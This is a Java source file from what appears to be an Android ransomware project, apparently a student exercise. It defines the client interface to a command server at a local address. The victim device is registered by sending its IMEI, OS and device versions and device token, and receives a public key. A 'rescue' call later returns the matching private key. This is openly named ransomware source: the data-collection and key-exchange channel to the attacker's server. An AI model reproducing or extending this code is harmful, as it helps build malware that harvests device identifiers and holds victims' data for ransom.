package fr.esgi.ransomware;

import android.content.Context;

import com.google.gson.annotations.SerializedName;

import retrofit2.Call;
import retrofit2.http.Body;
import retrofit2.http.GET;
import retrofit2.http.POST;
import retrofit2.http.Path;

public interface ApiService {
    String BASE_URL = "http://10.0.2.2:5000";

    @POST("mobile")
    Call<Register.Response> register(@Body ApiService.Register register);

    @GET("mobile/{uuid}")
    Call<RescueResponse> rescue(@Path("uuid") String uuid);

    class Register {
        private String imei;

        @SerializedName("os_version")
        private String osVersion;

        @SerializedName("device_version")
        private String deviceVersion;

        @SerializedName("device_token")
        private String deviceToken;

        Register(String imei, String osVersion, String deviceVersion, String deviceToken) {
            this.imei = imei;
            this.osVersion = osVersion;
            this.deviceVersion = deviceVersion;
            this.deviceToken = deviceToken;
        }

        public static Register BUILD(Context context) {
            return new Register(
                    Util.getImei(context),
                    Util.getOsVersion(),
                    Util.getDeviceVersion(),
                    Util.getDeviceToken(context.getContentResolver())
            );
        }

        public String getImei() {
            return imei;
        }

        public void setImei(String imei) {
            this.imei = imei;
        }

        public String getOsVersion() {
            return osVersion;
        }

        public void setOsVersion(String osVersion) {
            this.osVersion = osVersion;
        }

        public String getDeviceVersion() {
            return deviceVersion;
        }

        public void setDeviceVersion(String deviceVersion) {
            this.deviceVersion = deviceVersion;
        }

        public String getDeviceToken() {
            return deviceToken;
        }

        public void setDeviceToken(String deviceToken) {
            this.deviceToken = deviceToken;
        }

        @Override
        public String toString() {
            return "Register{" +
                    "imei='" + imei + '\'' +
                    ", osVersion='" + osVersion + '\'' +
                    ", deviceVersion='" + deviceVersion + '\'' +
                    ", deviceToken='" + deviceToken + '\'' +
                    '}';
        }


        class Response {
            private String uuid;

            @SerializedName("public_key")
            private String publicKey;

            public String getUuid() {
                return uuid;
            }

            public String getPublicKey() {
                return publicKey;
            }
        }
    }


    class RescueResponse {
        private String uuid;
        private String imei;

        @SerializedName("os_version")
        private String osVersion;

        @SerializedName("device_version")
        private String deviceVersion;

        @SerializedName("device_token")
        private String deviceToken;

        @SerializedName("public_key")
        private String publicKey;

        @SerializedName("private_key")
        private String privateKey;

        private String ip;


        public String getUuid() {
            return uuid;
        }

        public String getImei() {
            return imei;
        }

        public String getOsVersion() {
            return osVersion;
        }

        public String getDeviceVersion() {
            return deviceVersion;
        }

        public String getDeviceToken() {
            return deviceToken;
        }

        public String getPublicKey() {
            return publicKey;
        }

        public String getPrivateKey() {
            return privateKey;
        }

        public String getIp() {
            return ip;
        }
    }
}
